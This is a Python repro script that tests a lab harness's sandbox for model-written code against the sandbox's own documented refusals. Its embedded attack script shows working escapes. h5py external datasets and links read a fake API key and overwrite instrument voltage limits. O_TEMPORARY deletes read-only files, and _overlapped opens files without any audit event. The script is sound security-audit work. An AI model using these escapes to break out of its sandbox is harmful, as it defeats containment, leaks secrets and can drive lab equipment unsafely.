"""Repro: what run_python's sandbox says it refuses (sandbox.py:10-14) against what it refuses.

sandbox.py's own words: the audit hook "refuses: writing, renaming or deleting anything outside the scratch folder;
reading files other than the scratch folder's, the runs it was given and Python's own; network connections; starting
programs; native libraries (ctypes); the Windows registry; and instrument packages (pyvisa, serial, usb...). h5py
opens nothing outside the scratch folder for writing, and reads only those runs."

Each try below is a few lines of ordinary Python or h5py that code written by a model could contain; none goes
through a bug in a native extension, and none looks inside the hook. Everything it touches is in a temporary
folder made here: a pretend settings file with a key in it, a pretend lab config with limits, a run the code was
NOT given, and a copy of a run it WAS given.
"""
import json
import os
import shutil
import sys
import tempfile
import textwrap
from pathlib import Path

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from _harness import fakes, make_lab, run_script, write_script
from labharness import sandbox

LAB = """
lab: Sandbox lab
instruments:
  smu:
    card: virtual/source-meter
    address: GPIB0::24::INSTR
    limits: { V: [-10, 10] }
    rates: { V: 10 }
"""

READS = '''
import pyvisa
smu = pyvisa.ResourceManager().open_resource("GPIB0::24::INSTR")
for k in range(3):
    print(smu.query("MEAS:CURR?"))
'''

CODE = r'''
import os, sys, json
OUT = json.load(open("targets.json"))     # written into the scratch folder by the repro: just the paths to try
secret, config, other_h5, given_copy = OUT["secret"], OUT["config"], OUT["other_h5"], OUT["given_copy"]

def attempt(name, fn):
    try:
        print("%-58s -> %s" % (name, fn()))
    except BaseException as e:
        print("%-58s -> REFUSED %s: %s" % (name, type(e).__name__, str(e)[:90]))

print("--- what the hook is there for (expected: all refused) ---")
attempt("open(settings.json) to read", lambda: open(secret).read())
attempt("open(lab.yaml, 'w')", lambda: open(config, "w").write("x"))
attempt("os.remove(lab.yaml)", lambda: os.remove(config))
attempt("socket.create_connection(('127.0.0.1', 9))", lambda: __import__("socket").create_connection(("127.0.0.1", 9), 1))
attempt("subprocess.run(['cmd', '/c', 'ver'])", lambda: __import__("subprocess").run(["cmd", "/c", "ver"]))
attempt("import pyvisa", lambda: __import__("pyvisa").__name__)
attempt("import serial", lambda: __import__("serial").__name__)
attempt("h5py.File(other run.h5, 'r')  (a run it was not given)", lambda: __import__("h5py").File(other_h5, "r").keys())

print()
print("--- 1. h5py external storage: a dataset whose bytes live in any file ---")
import h5py, numpy as np
def read_any(path, n=64):
    with h5py.File("leak.h5", "w") as f:
        d = f.create_dataset("x", shape=(n,), dtype="u1", external=[(path, 0, n)])
        return bytes(d[()]).rstrip(b"\0").decode("utf-8", "replace")
attempt("read settings.json through an external dataset", lambda: repr(read_any(secret)))
def write_any(path, text):
    data = np.frombuffer(text.encode(), dtype="u1")
    with h5py.File("poke.h5", "w") as f:
        d = f.create_dataset("x", shape=data.shape, dtype="u1", external=[(path, 0, data.size)])
        d[...] = data
    return "written"
attempt("overwrite lab.yaml through an external dataset", lambda: write_any(config, "limits: { V: [-210, 210] }   # "))

print()
print("--- 2. h5py external link from a file in the scratch folder to a run it was not given ---")
def link_read():
    with h5py.File("link.h5", "w") as f:
        f["other"] = h5py.ExternalLink(other_h5, "/")
        return "its points: %s" % list(f["other"]["points"]["v"][()])
attempt("read the other run through an external link", link_read)
def link_write():
    with h5py.File("link.h5", "a") as f:
        f["other"]["points"]["v"][...] = -1.0
        return "changed"
attempt("change the other run's data through the link", link_write)

print()
print("--- 3. os.open with O_TEMPORARY (delete on close) on a file it may read ---")
def temp_delete(path):
    os.close(os.open(path, os.O_RDONLY | os.O_TEMPORARY))
    return "still there: %s" % os.path.exists(path)
attempt("given run's commands.jsonl (a copy): open O_TEMPORARY, close", lambda: temp_delete(given_copy))
attempt("given run's run.h5 (Kelvin marked it read-only)", lambda: temp_delete(OUT["given_h5"]))

print()
print("--- 4. _overlapped (asyncio's Windows module): CreateFile on any path, no audit event ---")
def overlapped_read():
    import _overlapped
    h = _overlapped.ConnectPipe(secret)
    ov = _overlapped.Overlapped(0)
    ov.ReadFile(h, 64)
    return repr(ov.getresult(True)[:40])
attempt("read settings.json with _overlapped", overlapped_read)

print()
print("--- 5. Kelvin's own modules the hook names (labharness.gate, .lab, .adapters, .engine...) ---")
def kelvin_modules():
    import labharness.gate, labharness.lab, labharness.adapters, labharness.engine, labharness.instrument
    return "imported: gate, lab, adapters, engine, instrument (already loaded before the hook)"
attempt("import labharness.gate / lab / adapters / engine", kelvin_modules)
attempt("import labharness.agent.runtime", lambda: __import__("labharness.agent.runtime").__name__)

print()
print("--- 6. looking around without opening: os.stat ---")
attempt("os.stat(settings.json).st_size", lambda: os.stat(secret).st_size)
'''


def main():
    with tempfile.TemporaryDirectory(prefix="audit-sandbox-") as tmp:
        tmp = Path(tmp)
        fakes(tmp)
        folder = tmp / "scripts"
        folder.mkdir()
        write_script(folder, "reads.py", READS)
        lab = make_lab(LAB)
        _, _, _, report = run_script(lab, folder, tmp / "data" / "runs", "reads.py", answers=[True])
        given = Path(report.path)                       # the run the code is given
        assert (given / "run.h5").is_file(), "the run kept no run.h5"
        kelvin = tmp / "Kelvin"                         # stands for ~/Kelvin
        kelvin.mkdir()
        secret = kelvin / "settings.json"
        secret.write_text('{"anthropic_api_key": "sk-ant-NOT-A-REAL-KEY-0123456789"}', encoding="utf-8")
        config = kelvin / "lab.yaml"
        config.write_text("limits: { V: [-10, 10] }\n", encoding="utf-8")
        other = tmp / "data" / "runs" / "someone-elses-run"   # a run the code is not given
        other.mkdir(parents=True)
        import h5py
        import numpy as np
        with h5py.File(other / "run.h5", "w") as f:
            f.create_group("points").create_dataset("v", data=np.array([1.0, 2.0, 3.0]))
        given_copy = given / "commands-copy.jsonl"      # in the given run's folder: the code may read it
        shutil.copy2(given / "commands.jsonl", given_copy)
        given_h5 = given / "run-copy.h5"                # a copy of its run.h5, read-only as Kelvin keeps run.h5
        shutil.copy2(given / "run.h5", given_h5)

        base = tmp / "data" / "python"
        base.mkdir(parents=True)
        # the scratch folder is made by sandbox.run; the paths go in through the code itself
        targets = {"secret": str(secret), "config": str(config), "other_h5": str(other / "run.h5"),
                   "given_copy": str(given_copy), "given_h5": str(given_h5)}
        code = CODE.replace('json.load(open("targets.json"))', repr(targets))
        out = sandbox.run(code, {report.run_id: given}, base, timeout_s=120)
        print("run_python status:", out.status, "| notes:", out.notes)
        print(out.output)
        print("=== afterwards, seen from outside the sandbox ===")
        print("lab.yaml now reads:", repr(config.read_text(encoding="utf-8", errors="replace")))
        with h5py.File(other / "run.h5", "r") as f:
            print("the other run's points/v:", list(f["points"]["v"][()]))
        print("the given run's commands-copy.jsonl still exists:", given_copy.exists())
        print("the given run's run-copy.h5 (read-only) still exists:", given_h5.exists())
        os.chmod(given_h5, 0o666)   # so the temporary folder can be removed


if __name__ == "__main__":
    main()
